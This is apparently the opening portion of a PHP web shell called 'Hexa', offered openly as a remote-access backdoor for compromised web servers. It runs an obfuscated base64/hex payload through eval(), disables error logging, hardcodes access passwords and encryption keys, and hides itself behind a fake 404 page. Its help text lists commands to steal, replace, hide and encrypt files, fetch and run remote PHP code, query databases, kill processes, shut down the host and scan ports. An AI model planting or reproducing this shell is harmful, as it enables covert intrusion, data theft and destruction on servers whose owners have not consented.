<?php
/**
 * Hexa web shell
 *
 * @version 1.0
 * @author  Nico Duitsmann (3v1l_un1c0rn)
 * @license GNU General Public License Version 3
 */

error_reporting(0);
error_log(0);
eval(base64_decode("\x5a\x58\x5a\x68\x62\x43\x68\x6e\x65\x6d\x6c\x75\x5a\x6d\x78\x68\x64\x47\x55\x6f\x63\x33\x52\x79\x58\x33\x4a\x76d\x44\x45\x7a\x4b\x47\x4a\x68\x63\x32\x55\x32\x4e\x46\x39\x6b\x5a\x57\x4e\x76\x5a\x47\x55\x6f\x4a\x30\x52\x61\x59\x6b\x5a\x45\x64\x58\x64\x48\x52E\x5a\x4a\x4c\x33\x41\x32\x4c\x30\x74\x4a\x62\x47\x31\x78\x64\x57\x64\x71\x56\x47\x68\x45\x62\x57\x4a\x4c\x63\x48\x68\x61\x62\x55\x39\x49\x63\x6b\x38\x35\x4e\x55\x31\x73\x64\x56\x56\x79\x4d\x6e\x70\x77\x63\x47\x4a\x4c\x59\x6a\x6c\x75\x4c\x33\x41\x32\x65\x44\x5a\x77\x51\x7a\x6b\x76\x53\x6b\x4e\x73\x62\x55\x56\x73\x5a\x32\x59\x78\x53\x32\x78\x51\x62\x45\x68\x73\x53\x43\x73\x79\x5a\x6d\x59\x78\x61\x57\x35\x58\x61\x31\x6b\x76\x5a\x6b\x39\x59\x63\x54\x4e\x58\x64\x54\x4e\x6d\x51\x30\x49\x7a\x55\x30\x6c\x36\x62\x32\x4e\x71\x63\x32\x52\x42\x61\x30\x78\x48\x4d\x6b\x31\x70\x53\x6d\x52\x36\x59\x6d\x56\x55\x51\x55\x64\x49\x53\x46\x5a\x45\x4e\x55\x56\x32\x61\x54\x55\x35\x56\x6c\x5a\x52\x61\x57\x5a\x70\x51\x6b\x5a\x57\x54\x33\x68\x68\x54\x30\x64\x4b\x4d\x55\x70\x30\x52\x6e\x64\x57\x55\x7a\x4e\x68\x62\x30\x4e\x72\x5a\x30\x64\x76\x55\x47\x68\x76\x63\x45\x6c\x50\x57\x6a\x4e\x42\x61\x54\x64\x74\x61\x6c\x56\x73\x54\x32\x64\x77\x55\x6a\x56\x4a\x63\x56J\x50\x4fE\x59\x7a\x55\x6d\x70\x34\x4d\x46\x70\x72\x56\x6e\x4e\x5a\x56\x47\x31\x51\x59\x55\x6f\x31\x51\x56\x64\x34\x59\x57\x46\x4f\x57\x55\x4a\x75\x64\x45\x4e\x69\x64\x45\x73\x72\x63\x6b\x4a\x34\x57\x44\x42\x6b\x52\x56\x64\x45\x5a\x47\x56\x56\x61\x6c\x64\x6c\x53j\x5a\x74\x55\x7a\x6c\x69\x55\x32\x56\x43\x57\x57\x74\x5a\x54\x6c\x56\x53\x53\x6d\x31\x6a\x63\x56F\x53\x57\x55\x31\x43\x53\x45\x64\x50\x56\x6a\x49\x79\x54\x45\x64\x74\x55\x58\x5a\x6d\x64\x33\x68\x75\x62\x6b\x46\x52\x54\x56\x67\x78\x55\x32\x52\x35\x57\x46\x5a\x33\x64\x48\x68\x54\x61\x47\x68\x31\x62\x6b\x77\x79\x4d\x57\x31\x4d\x4d\x6d\x4a\x35\x5a\x57\x51\x72\x62\x32s\x33\x53\x31\x4e\x32\x56\x6b\x35\x56\x59\x6e\x42\x7a\x52\x6b\x70\x49\x54\x30\x56\x4d\x57\x58\x4a\x47\x56\x6e\x46\x5a\x64\x7a\x6c\x51T\x54\x4d\x7a\x4e\x44\x56\x4c\x4d\x57\x52\x4e\x62\x47\x49\x33\x51\x55\x56\x57\x4e\x46\x63\x32\x63\x47\x31\x51\x4d\x54\x6c\x4f\x4e\x33\x4a\x43\x63\x58\x51\x35\x4c\x7a\x56\x7a\x52\x6a\x68\x6e\x64\x46\x6c\x77\x56\x58\x41\x35\x54\x30\x74\x6c\x5a\x55\x35\x33\x65\x45\x5a\x51\x55\x46\x56\x72\x52\x6a\x42\x31\x59\x6a\x56\x33\x52\x32\x35\x43\x4d\x57\x78\x70\x61\x47\x5a\x42\x4d\x6c\x5a\x5a\x65\x6a\x45\x77\x63\x32\x31\x6f\x4e\x53\x39\x4c\x62\x6d\x68\x77\x4e\x53\x74\x4b\x62\x6b\x78\x4d\x5a\x6a\x56\x50\x63\x6b\x35\x73\x5a\x7a\x64\x55\x54\x44\x463\x52\x45\x38\x7a\x56\x31\x4e\x77\x57\x54\x6c\x74\x63\x32\x78\x45\x65\x6c\x68\x76\x51\x31\x56\x33\x59\x55\x35\x5a\x4d\x46\x67\x77\x61\x6b\x6f\x33\x57\x6d\x46\x72U\x46\x4e\x57\x53\x55\x56\x34\x52\x46\x6c\x31\x56\x58\x4a\x31\x4d\x56\x4e\x71\x4d\x32\x52\x68\x64\x45\x70\x4eZ\x47\x56\x44\x64\x57\x68\x6d\x62\x57\x6c\x48\x57\x44\x52\x5a\x57\x47\x4a\x6b\x4d\x6d\x35\x46\x61\x6d\x64\x77\x4d\x30\x6c\x6c\x4e\x7a\x46\x71\x53\x46\x52\x42\x56\x6e\x56\x32\x54\x44\x4e\x72\x57\x44\x45\x78\x61\x55\x39\x61\x53\x7a\x45\x79\x54\x6e\x52\x4d\x64\x32\x35\x56\x51\x33\x6c\x35\x54\x45\x39\x48\x4e\x6b\x51\x7a\x5a\x56\x56\x76\x63\x31\x42\x4f\x62\x7a\x4e\x49\x4d\x6e\x6c\x4f\x56\x46\x49\x35\x54\x55\x5a\x32\x57\x6d\x64\x70\x52\x30\x6b\x78\x55\x56\x42\x4d\x61\x45\x52\x55\x65\x58\x4e\x44\x4d\x54\x42\x78\x53\x55\x51\x78\x4d\x44\x52\x36\x53\x47\x38\x33\x4d\x33\x4e\x6e\x59\x7a\x46\x4c\x64\x58\x70\x4f\x64\x47\x74\x4b\x56\x6c\x67\x32\x4f\x58\x4e\x78\x64\x6d\x6c\x5a\x61\x55\x52\x5aa\x31\x46\x35\x53\x55\x6c\x61\x61\x33\x6c\x57\x4f\x55\x46\x43\x61\x30\x35\x73\x63\x56\x49\x78\x65X\x70\x71\x5a\x44\x6c\x31\x62\x6d\x6c\x4f\x64\x55\x70\x55\x55\x6b\x4e\x4c\x54\x55\x70\x61\x54\x57\x45\x30\x54\x57\x68\x4c\x61\x32\x34\x31\x55\x45\x77\x76\x53\x56\x4a\x6c\x4e\x55\x34\x30\x65\x55\x70\x7a\x64\x31\x52\x44\x51\x7a\x4e\x73\x64\x57\x31\x79\x5a\x54\x64\x5a\x51\x7a\x4a\x52\x4d\x54\x68\x4b\x51\x54\x46\x52\x55\x33\x70\x73\x59\x56\x64\x68\x4e\x56\x4d\x7a\x61\x31\x42\x33\x4f\x46\x56\x46\x63\x57\x56\x72\x55\x79\x39\x68\x63\x7a\x4e\x36\x4e\x6e\x46\x78\x63\x58\x64\x53\x4e\x48\x52\x58\x4d\x57\x70\x4a\x65\x6a\x52\x75\x64\x57\x64\x54\x52\x57\x52\x54\x53\x55\x46\x6c\x57U\x4a\x6c\x51\x30\x39\x5a\x65\x57\x46\x4d\x51\x32\x74\x61\x53\x33\x4d\x32\x52\x48\x42\x74\x56\x7a\x5a\x59\x56\x31\x56\x4b\x63k\x59\x76\x54\x31\x68\x46\x52\x33\x4e\x35\x52\x7a\x5a\x47\x56\x6c\x56\x6b\x54\x30\x74\x53\x53\x57\x45\x76\x63\x33\x64\x49\x61\x6e\x70\x35\x54\x6d\x31\x6f\x64\x55\x35\x69\x53\x6b\x39\x58\x59\x31\x52\x46\x4f\x47\x70\x50\x5a\x6a\x4d\x79\x4d\x31\x4e\x7a\x5a\x55\x68\x78\x4b\x30\x46\x53W\x6c\x70\x59\x53\x58\x6f\x31\x62\x46\x45\x72\x54\x31\x67\x34\x62\x33\x49\x72\x4b\x30\x74\x5a\x64\x56\x64\x30\x53\x44\x4e\x75\x65\x6e\x5a\x76\x57\x54\x56\x6f\x4b\x7a\x64\x4c\x55\x30\x31\x54\x4d\x6b\x74\x69\x62\x54\x59\x79\x4f\x56\x68\x69\x53\x58\x41\x30\x4e\x31\x68\x53\x65\x6b\x70\x78\x5a\x6b\x5a\x32\x5a\x55\x4d\x34\x54\x30\x68\x52\x61\x56\x45\x79\x62\x55\x31\x4bZ\x6a\x46\x48\x61\x57\x4a\x58\x4d\x54\x64\x6e\x64\x33\x6c\x4e\x59\x6b\x74\x74\x4e\x6a\x64\x45\x55\x55\x52\x56\x4d\x54\x6c\x57\x4d\x6b\x46\x6c\x61\x48\x4e\x48\x59\x6e\x70\x51\x54\x6b\x31\x30\x4e\x6c\x68\x6b\x52\x54\x5a\x76\x54\x45\x31\x35\x53\x79\x38\x33\x62\x32\x6c\x72\x4e\x33\x52\x44\x61\x47\x31\x71\x5a\x47\x5a\x34\x61\x44\x52\x30\x59\x31\x70\x6c\x62\x58\x63\x35\x4d\x6e\x70\x4b\x61T\x4a\x30\x62\x6b\x4e\x59\x59\x6d\x31\x46\x51\x6e\x52\x45\x53\x6b\x52\x6d\x63\x33\x64\x51\x4b\x7a\x4d\x72\x4e\x6a\x6c\x36\x64\x55\x52\x30\x61\x56\x6c\x50\x5a\x58\x4a\x33\x52\x54N\x53\x53\x33\x52\x4ab\x54\x46\x79\x55\x6a\x52\x77\x52\x6e\x59\x78\x4f\x46\x6f\x35\x62\x6b\x46\x76\x63\x6d\x56\x54\x63\x55\x78\x4c\x64\x48\x46\x47\x53\x48\x52\x47\x5a\x56\x64\x4a\x4b\x7a\x52\x5a\x59\x6b\x39\x69\x53\x31\x6c\x49\x62\x48\x42\x30\x4f\x45\x31\x4a\x52\x6d\x45\x32\x51\x6b\x74\x51\x64\x44\x56\x6e\x61\x58\x67\x72\x63\x47\x6c\x33\x55\x6b\x6c\x49\x64\x45\x70\x33\x57\x6b\x4a\x73\x4e\x6a\x55\x72\x64k\x4d\x72\x65\x47\x46\x78\x5a\x6e\x6f\x76\x56\x44\x55\x33\x63\x6e\x52\x5a\x4c\x33\x5a\x74\x61\x6a\x42\x6f\x4e\x46\x5a\x50\x51\x6d\x34\x35\x4d\x47\x64\x74\x56\x6d\x39\x58\x4c\x30\x74\x50\x4d\x45\x31\x49\x53\x30\x46\x68\x64\x45\x67\x78\x57\x575\x34\x65\x45\x31\x61\x51\x55\x39\x36c\x33\x42\x7a\x52\x47\x70\x4f\x54\x54\x59\x30\x55\x7a\x4d3\x54\x6c\x52\x79\x61\x46\x63\x33S\x45\x78\x48\x4b\x31\x46\x46\x64\x47\x74\x61\x52\x55\x46\x68\x54\x6a\x5a\x47\x4c\x33\x6c\x71\x52\x55\x70\x48\x51\x6d\x4a\x54\x55\x45\x39\x46\x65\x43\x39\x46\x61\x55\x56\x4d\x4c\x30\x35\x42\x56\x48\x64\x30\x57\x53\x39\x71\x4e\x45\x39\x50\x52\x56\x6c\x47\x53\x45\x6c\x6b\x57\x56\x5a\x4e\x4d\x6e\x42\x52\x4f\x56\x6c\x73\x56\x46\x68\x30\x55\x48\x59\x79\x54\x7a\x64\x68\x57\x48\x68V\x63\x45\x59\x79\x59\x55\x52\x45\x62\x48\x42\x77\x52\x48\x42\x30\x59\x31\x59\x72\x62\x55\x39\x4b\x56\x30\x68\x78\x55\x48\x46\x54\x53\x44\x460\x4d\x6e\x6c\x57\x62\x33\x6c\x6f\x5a\x45\x4e\x44\x57\x47\x78\x47\x63\x6d\x64\x44\x61\x55\x31\x68\x53\x33\x56\x57\x57\x6e\x4e\x30\x63\x55\x31\x46\x59\x53\x38\x30\x54\x54\x42\x6b\x5a\x56\x64\x34\x4d\x44\x6c\x4b\x4d\x32\x6f\x7a\x54\x6e\x5a\x33\x55\x55\x31\x7a\x4d\x32\x35\x58\x63\x57\x68\x77\x52\x57\x39\x79\x4e\x6b\x64R\x53\x6c\x64\x6e\x5a\x30\x4d\x72\x63\x58\x5a\x5a\x55\x6d\x4a\x36\x56\x6b\x5a\x71Z\x46\x6c\x73\x63\x32\x63\x78\x61\x47\x59\x78\x5a\x30\x34\x78\x61\x6a\x51\x34\x61\x45\x6c\x69\x62\x6b\x4a\x52\x57\x6a\x42\x57\x4d\x30\x46\x4c\x4d\x31\x4e\x4c\x56\x57\x64\x76\x57\x57\x74\x30\x4e\x6b\x46\x57\x62\x58\x52\x58\x63\x6a\x49\x79\x4e\x6e\x70\x74\x4d\x69\x39\x51\x53\x57\x64\x6f\x51\x6b\x4e\x42\x4c\x7a\x52\x5a\x5a\x47\x49\x72\x64\x48\x52\x77\x62\x32\x56\x4b\x4d\x32\x70\x32\x52\x47\x52\x4e\x64\x54\x4a\x34\x61\x46\x56\x43\x4d\x6e\x51\x31\x53\x48\x5a\x32Q\x57\x31\x51\x63\x32\x51\x78\x61\x46\x64\x35\x61\x7a\x46\x52\x4e\x6b\x68\x6d\x57\x46\x6c\x4f\x54\x33\x4a\x59\x4e\x6c\x4a\x6b\x4e\x55\x45\x34\x53\x31\x68\x55Q\x6d\x46\x54\x52\x57\x39\x58\x56\x32\x39\x70\x59\x55\x5a\x72\x63\x57\x6by\x63\x33\x70\x69\x63\x6b\x5a\x49\x62\x48\x52\x44\x62\x46\x51y\x5a\x45\x31\x6b\x59\x31\x68\x76\x62\x6e\x46\x6c\x5a\x47\x31\x4b\x54\x56\x4e\x31\x63\x6d\x56\x43\x5a\x33\x52\x61\x62\x55\x52\x50\x64\x6d\x46\x7a\x56\x44\x64\x34\x55\x54\x52\x72\x59\x32\x68\x4f\x65\x58\x56\x45\x65\x54\x46\x46\x62\x33\x68\x70\x64\x46\x4e\x4d\x4f\x58\x6c\x75\x5a\x47\x6c\x33\x57\x45\x68\x53\x5a\x32\x39\x52\x5a\x7a\x6c\x44\x62\x53\x74\x42\x4d\x31\x46\x35\x61\x7a\x46\x4d\x64\x48\x64\x4d\x62\x53\x74\x35\x4e\x7a\x56\x4d\x63\x31\x56\x35\x56\x6c\x46\x72\x53\x6b\x78\x59\x65\x55\x52\x76\x64\x57\x56J\x4d\x55\x52\x73\x56\x57\x52\x58\x4e\x6e\x42\x4d\x52\x6e\x42\x6e\x5a\x55\x5a\x4f\x5a\x56\x68\x43\x5a\x30\x63\x30\x53\x33\x5a\x75\x65\x46\x6c\x6f\x52\x6c\x5a\x76\x52\x6d\x56\x78\x55\x6b\x4e\x44\x57\x45\x45\x34\x4d\x47\x77\x7a\x64\x46\x64\x45\x64\x58\x45\x7a\x61\x47\x35\x68\x59\x55\x78\x6b\x64\x33\x64\x61\x53\x58\x41\x34\x5a\x58\x64\x44\x51\x30\x70\x75\x4c\x33\x56\x36\x4d\x55\x46\x6c\x65\x56\x46\x43\x51\x6e\x56\x69\x53\x48\x4e\x56\x52\x56\x41\x76\x53\x56\x6b\x79\x63\x6d\x6cD\x54\x32\x78\x77\x5a\x6e\x4e\x34\x52\x44\x5a\x45\x65\x47\x46\x48\x5a\x6b\x67\x34\x61\x58\x64\x75\x54\x6d\x74\x68\x4f\x45\x4a\x43\x52\x45\x4e\x36\x55\x31\x64\x6c\x52\x6b\x31\x50\x53\x6d\x4a\x32\x54\x57\x52\x43\x65\x69\x39\x4a\x4d\x56\x46\x43Z\x47\x59\x76\x64\x6c\x46\x6d\x51\x6d\x31\x47\x54\x47\x30\x72\x62\x31\x64\x73\x65\x44\x6c\x6c\x56\x57\x70\x47\x53\x54\x5a\x6e\x51\x31\x52\x6f\x53\x6d\x4a\x69\x54\x30\x5a\x77\x5a\x6d\x31\x33\x4d\x45\x78\x75\x54\x6d\x78\x30\x56\x53\x74\x75\x54\x54\x59\x34\x52\x53\x74\x52\x59\x53\x74\x56\x61k\x4a\x77\x64\x31\x4e\x6e\x59\x55\x4e\x46\x4d\x6c\x42\x76\x4c\x32\x4e\x56\x51\x6e\x68\x68\x65\x57\x31\x4e\x57\x47\x74\x6f\x54\x6d\x70\x7a\x61\x45\x56\x75\x63\x32\x70\x7a\x57\x58\x52\x54\x56\x6c\x5a\x5a\x59\x33\x56\x5a\x61\x45\x52\x78\x4d\x56\x56\x34\x55\x47\x46\x77\x57\x6a\x52\x61\x5a\x6d\x38\x32\x4c\x32\x68\x45\x54\x53\x39\x32\x63\x30\x31\x6b\x52\x45\x46\x30\x55\x30\x4e\x4e\x59\x32\x68\x42\x59\x6a\x59\x34\x54\x6d\x4d\x32\x62\x6a\x41\x72\x4b\x31\x42\x30\x56\x56\x52\x55\x56\x6d\x68\x50\x56\x56\x63\x79\x51\x55\x4e\x36\x55\x31A\x79\x52\x55\x5a\x4a\x5a\x6e\x4a\x46\x61\x47\x4e\x49\x65\x45\x56\x6c\x51\x6d\x6b\x33\x57\x47\x31\x6d\x62\x46\x56\x4a\x53\x6b\x64\x58\x53\x6d\x39\x4d\x63\x30\x46\x4f\x4f\x56\x4e\x6d\x65\x6d\x31\x4f\x62\x32\x74\x74\x53\x57\x38\x31\x63\x31\x56\x4a\x52j\x64\x4e\x54\x6d\x70\x45\x62\x47\x6f\x33\x57\x6b\x5a\x78\x5a\x32\x52\x58\x54\x30\x74\x6b\x59\x6d\x64\x6d\x64\x58\x5a\x6a\x52\x58F\x61\x5a\x30\x70\x73\x4e\x32\x63\x7a\x56\x559\x31\x4e\x58\x64\x4c\x53\x57\x4a\x33\x61\x31\x4e\x76\x54\x30\x4e\x4b\x51\x56\x46\x77\x65\x55\x68\x75\x53\x45\x30\x79\x4e\x47\x4e\x68\x4e\x6a\x4a\x31\x52\x46\x6f\x31\x57\x48\x4d\x78\x51\x6c\x68\x56\x61\x69\x39\x70\x5a\x57\x64\x57\x53\x44\x63\x79\x61\x54\x51\x78\x4f\x56\x5a\x58\x53\x54\x42\x7a\x55\x44\x64\x31\x65\x56\x6c\x46\x55\x58\x52\x68\x4d\x6d\x63\x31\x51\x6b\x64\x55\x51\x6e\x45\x32\x5a\x31\x5a\x78\x64\x57\x30\x34\x55\x6d\x56\x33\x51\x30\x30\x78\x55\x6a\x49\x33\x51\x6a\x42\x72\x52\x58\x46\x6a\x55\x55\x46\x56\x64\x55\x52\x32\x54\x6a\x68\x46\x4e\x6d\x52\x61\x4e\x55\x78\x46\x65\x46\x70\x43\x59\x30\x77\x7a\x63\x79\x74\x5a\x64\x44\x5a\x49\x55\x57\x56\x55\x53\x31\x4a\x34\x4d\x32\x55\x34\x52\x47\x6c\x48\x53\x55\x35\x56\x64\x6a\x56\x58\x59\x32\x74\x57\x62\x48\x5a\x6b\x4f\x54\x46\x53\x64\x48\x70\x56\x55\x6b\x4a\x77c\x7a\x59\x76\x63\x30\x56\x56\x5a\x47\x68\x49T\x7a\x56\x55\x65\x47\x49\x72\x52\x30\x5a\x4b\x62\x79\x74\x4e\x55\x6b\x6c\x73\x51\x30\x31\x35\x5a\x46\x49\x31\x61\x6c\x46\x4d\x4f\x48\x42\x53\x4e\x55\x39\x4a\x64\x31\x68\x6a\x53\x56\x56\x54\x63\x48\x70\x51\x51\x6b\x56\x4c\x52\x6e\x6b\x79\x4f\x45\x35\x6d\x57\x6b\x64\x56\x61\x57\x39\x4f\x63\x32\x55\x33\x64\x30\x52\x6c\x65\x48\x64\x54\x57\x54\x56\x36\x65\x47\x73\x7a\x54\x56\x6c\x78\x56\x31\x49\x35\x51\x6e\x6c\x61\x55\x6b\x68\x47\x52\x54h\x74\x54\x44\x68\x74\x4b\x33\x6c\x6b\x63\x32\x4d\x79\x53\x47\x59\x34\x65\x55\x5av\x53\x6d\x68\x44\x64\x31\x4e\x6a\x53\x55\x70\x52\x4f\x48\x68\x74\x4f\x47\x68\x4d\x61\x55\x68\x45\x56\x55\x52K\x64\x32\x30\x32\x59\x30\x4d\x7a\x52\x6c\x6c\x30\x4e\x6a\x67\x72Y\x6d\x39\x4a\x62\x53\x39\x52\x51\x55\x5a\x6f\x4d\x48\x56\x34\x56\x6b\x78\x4d\x62\x58\x52\x69\x53\x6e\x56\x55\x64\x47\x56\x44\x4e\x46\x42\x6f\x57\x6b\x59\x34\x4e\x58\x64\x50\x5a\x55\x6f\x7a\x53\x6c\x64\x4b\x4f\x47\x46\x35\x5a\x6b\x31\x6a\x51\x56\x70\x73\x59\x6e\x64\x52\x54\x48\x52\x33\x65\x6b\x64\x79\x4f\x55\x39\x31\x64\x56\x42\x6f\x56\x6c\x55\x7a\x4c\x32\x31\x52\x54\x33\x46\x58\x53\x45\x31\x33\x51\x31F\x32\x4e\x6a\x56\x5a\x61\x6d\x74\x4aa\x6c\x6c\x70\x4c\x32\x49\x77\x62\x58\x6f\x7a\x4e\x47\x4e\x4a\x4e\x46\x4d\x7a\x4d\x33\x52\x44\x53\x58\x4d\x72\x64\x57\x4a\x73\x4f\x48\x52\x55\x4e\x6c\x51\x35\x4d\x7a\x4a\x69\x64\x33\x70\x6f\x61\x30d\x6f\x542\x5a\x43\x55\x58\x68\x50\x57\x6b\x35\x36\x4f\x45\x39\x55\x52E\x46\x4b\x4e\x33\x56\x74\x53\x44\x4d\x76\x59\x31\x56\x55\x64\x48\x59\x34\x55\x6b\x4a\x68\x63\x46\x56\x58\x4d\x6b\x4a\x36\x65\x6a\x4d\x32\x5aU\x6c\x7a\x4e\x30\x52\x58\x62\x47\x63\x79\x62\x45\x70\x78\x52\x6b\x56\x61d\x54\x4e\x79\x61\x44\x5a\x6b\x56\x6c\x45\x78\x57\x47\x56\x6d\x56\x30\x56\x47\x56\x44\x52\x30\x63\x54\x49\x35\x4d\x47\x4a\x35\x62\x6b\x4e\x34\x4d\x56\x6c\x59\x61\x6a\x52\x33\x64\x6d\x70\x6e\x5a\x6b\x68\x7a\x55\x55\x56\x73\x4f\x43\x74\x6d\x55\x7a\x4a\x6c\x63\x6b\x70\x6d\x62z\x68\x7a\x4b\x32\x78\x54\x4d\x32\x70\x35\x4d\x56\x52\x69\x57\x47\x46\x69\x4e\x30\x52\x72\x4c\x33\x4e\x55\x4d\x32\x31\x54\x51\x31\x56\x7a\x64\x47\x4d\x33\x54\x58\x68\x75\x65\x48\x56\x77\x51\x6a\x63\x77\x52\x329\x6e\x54\x56\x49\x7a\x62\x471\x4c\x4f\x45\x6f\x76\x5a\x45\x74\x45\x4d\x57\x46\x42\x55\x6c\x59\x33\x55\x56\x4a\x6e\x64\x6d\x74\x54\x54\x6c\x49\x33\x4e\x58\x55\x78\x62\x7a\x52\x30\x59\x55\x70\x54\x65\x56\x52\x6eW\x57\x78\x71\x54\x6d\x56\x53\x56\x56\x5a\x42\x4c\x32\x31\x74\x62\x46\x52\x61\x56\x31\x68\x6d\x51\x7a\x46\x46\x56\x32\x4a\x45\x57\x56\x4a\x77\x4d\x47\x30\x30\x64\x48\x52\x58\x4b\x31\x68\x36\x51\x56\x51\x31\x4f\x54\x56\x42\x55\x31\x51\x33\x57\x53\x74\x71\x61\x7a\x46\x6e\x4e\x54\x68\x53\x55\x47\x6c\x61\x64\x55\x30\x35\x63\x57\x70\x74\x522\x55\x35\x54\x48\x415\x57\x56\x51\x34\x54\x45\x4a\x6b\x63\x44\x63\x78\x4f\x55\x64\x5a\x51\x6c\x4e\x31\x61\x32\x78\x53\x53\x53\x38\x32\x53\x44\x49\x33\x4e\x33\x56\x56\x56\x48\x42\x31\x56\x6c\x55\x79\x62\x56\x42\x6c\x54\x33\x52\x5a\x65\x47\x31\x50\x52\x55\x4e\x69\x5a\x47\x63\x30\x59\x31\x4a\x79\x4d\x6d\x78\x4d\x62\x6d\x5a\x76\x56\x6cQ\x35\x55\x6c\x42\x51\x56\x6c\x5a\x7a\x64\x47\x55\x78\x53\x56\x64\x4f\x65\x57\x5a\x48\x61\x55\x39\x6a\x5a\x31\x52\x71\x61\x46\x6b\x72\x62\x58\x52\x4b\x5a\x45\x78\x53\x57\x69\x74\x71\x54\x53\x74\x4e\x54\x48\x42\x4e\x55\x56\x59\x35\x55\x31\x46\x30\x55\x6e\x68\x55\x54\x55\x38\x30\x63\x30\x67\x77\x4e\x6a\x42\x73\x51\x32\x4e\x73\x5a\x46\x51\x72\x55\x6c\x6c\x4d\x4d\x30\x4a\x70\x64\x48\x4d\x35\x62\x31\x6f\x78\x62\x46\x56\x72\x57\x46\x56\x6f\x59\x6e\x45\x76\x62\x57\x74\x49\x65\x45\x4e\x78\x63\x32\x70\x4f\x62\x6a\x42\x51\x64\x48\x64\x35\x65\x47\x70\x50\x59\x33\x4e\x56\x55\x54\x6c\x54\x57\x45\x4e\x43\x65\x6a\x6c\x32\x54\x31\x595\x53\x56\x4e\x47\x4e\x57\x64\x31\x4f\x44\x5a\x55\x65\x57\x74\x36\x63\x32\x68\x50\x51\x54\x64\x47\x4d\x6b\x31\x48\x55\x30\x4e\x6aR\x57\x31\x30\x4d\x57\x4e\x32c\x47\x39\x76\x56\x45\x68\x61\x51\x6d\x55\x35\x5a\x6e\x5a\x44\x4c\x30\x39\x53\x51\x31\x68\x73\x59\x55\x49\x72\x65\x44\x46\x73\x4d\x6a\x5a\x59\x59\x6a\x63\x32\x51\x6d\x77\x79\x53\x44\x4a\x51\x62\x30\x4e\x55\x4e\x44\x4e\x76\x56\x30\x74\x52\x63\x31\x56\x6cU\x31\x46\x34\x53\x48\x67\x30\x62\x30\x31\x52\x62\x47\x70\x54\x5a\x58\x6c\x45\x5a\x58\x5a\x61S\x6d\x46\x4a\x53\x47\x46\x50\x53\x55\x67\x72\x63\x6b\x39\x72\x56\x48\x4e\x42\x57\x6b\x38\x72\x51\x58\x4e\x49\x52\x33B\x42\x53\x6c\x59\x32\x61\x45\x6b\x77\x4c\x7a\x51\x33\x53\x58\x49\x79\x4f\x47\x38\x7a\x57\x57\x56\x4a\x59\x6b\x5a\x30\x61\x57\x5a\x33\x65\x58\x42\x6a\x64\x54\x64\x4f\x4d\x47\x56\x7a\x62\x33\x64\x78\x54\x30\x68\x4d\x56\x6b\x4a\x58\x56\x33\x42\x4f\x55\x57\x70\x6f\x61\x44\x4e\x78\x59\x6c\x59\x35\x4f\x55\x5a\x5a\x55\x31\x68\x52\x64\x45\x68\x4d\x61\x44\x68\x70\x51\x58\x46\x52\x57\x55\x4e\x47\x55\x48\x6f\x33\x51\x6b\x56\x51\x63\x54\x4d\x33\x4c\x79\x73\x76\x64\x47\x73\x76\x4c\x33\x64\x4e\x50\x53\x63\x70\x4b\x53\x6b\x70\x4f\x77\x3d\x3d"));

$shellName = basename(__FILE__); // basename of this file

if ( php_sapi_name() == 'cli' )
    die("Cli mode not supported.\n");

// set ini options
@ini_set('error_reporting', 1);
@ini_set('set_time_limit', 0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);

// ui options
define('UI_BG', '#ffffff'); // ui background color
define('UI_FC', '#333333'); // ui foreground color
define('UI_BC', '#00acc1'); // ui bold color

echo '<link rel="icon" href="https://png.icons8.com/color/100/000000/hexagon.png">';
echo '<style>html { background-color:'.UI_BG.'; color:'.UI_FC.';}strong { color:'.UI_BC.'; }</style>';

// define shell constants
define('PROTECT_PWD', '123456789');
define('SESSION_PWD', '12345');
define('SHELL_NAME', 'Hexa');
define('SHELL_AUTHOR', 'Nico Duitsmann');
define('SHELL_VERSION', '1.0');

// encryption mode ( POST )
if (!empty($_POST)) {
    define('ENC_MODE', true);
    define('SECRET', '~z13VeNG:WhdPb^N5U');
    define('IV', '3g&e35gW');
} elseif ( !empty($_GET) ) {
    define('ENC_MODE', false);
    echo '<title>'.SHELL_NAME.'('.$_SERVER['HTTP_HOST']-') @'.$_SERVER['SERVER_ADMIN'].'</title>';
}
define('SHELL_HELP',"
> ".
SHELL_NAME." supports both, GET and POST requests.
> Note: Only post request are encrypted. (status: ".var_export(ENC_MODE, true).")

Basic GET syntax:
-----------------

    {$shellName}?session_pwd=<strong>PASSWORD</strong>&shell=<strong>COMMAND</strong>[ARG1,ARG2...]

    PASSWORD                        Session password.
    COMMAND                         Command to execute to.

Available commands:
-------------------

    <strong>Shell commands:</strong>

    help                            Show this help.
    remove                          Remove shell from machine.

    <strong>File operations:</strong>
    
    get[FILE]                       Download file from this machine.
    urlget[URL,NEW]                 Download file from url to this machine.
    hide[FILE/DIR]                  Hide directory or file.
    delete[FILE/DIR]                Delete file or folder.
    create[FILE]                    Create blank file.
    copy[OLD,NEW]                   Copy file or folder.
    rename[OLD,NEW]                 Rename a file or folder.
    view[FILE]                      View file content.
    replace[FILE,CODE/URL]          Replace file content with custom code.
    encrypt[OBJ,SECRET,IV]          Try to encrypt file or folder with AES.
    decrypt[OBJ,SECRET,IV]          Try to encrypt file or folder with AES.
    finfo[FILE]                     Show file information.
    find[PATTERN,OBJ]               Find pattern in strings, files or directory's.

    <strong>System and db operations:</strong>

    shutdown 						Shutdown system.
    tasklist                        Show list of running processes.
    taskkill[TASK]                  Try to kill task.
    sysinfo                         Show advanced system information.
    geoinfo                         Show geoip information.
    phpinfo                         Show php information.
    query[QUERY,USER,PASS,DB]       Execute mysql query.
    eval[CODE/RAW_URL]              Evaluate a string as PHP code or run from raw url.
    
    <strong>Network:</strong>
    
    pscan[HOST,RANGE]               Perform port scan. Example range: 0-80000
");
define('EXIT_MESSAGE', "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>
<hr>
<address>".$_SERVER['SERVER_SIGNATURE']."</address>
</body></html>
<style>html {background-color:white;color:black;}</style>");

/**
 * Return server's operating system.
 * @return string
 */
$serverOs = function () {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
        return 'win';
    else
        return 'unix';
}; define('SERVER_OS', $serverOs);

/**
 * Return's cpu usage for each core.
 * @return string
 */
function getCpuUsage() {
	if ( function_exists('sys_getloadavg') ) {
	    $cores = sys_getloadavg();
	    $x = "";
	    foreach ( $cores as $core ) {
	        $x .= $core."% ";
	    }
	    return $x;
	} else return false;
}

/**
 * Execute's system command.
 * @param $cmd
 * @return bool
 */
function execCommand ($cmd) {
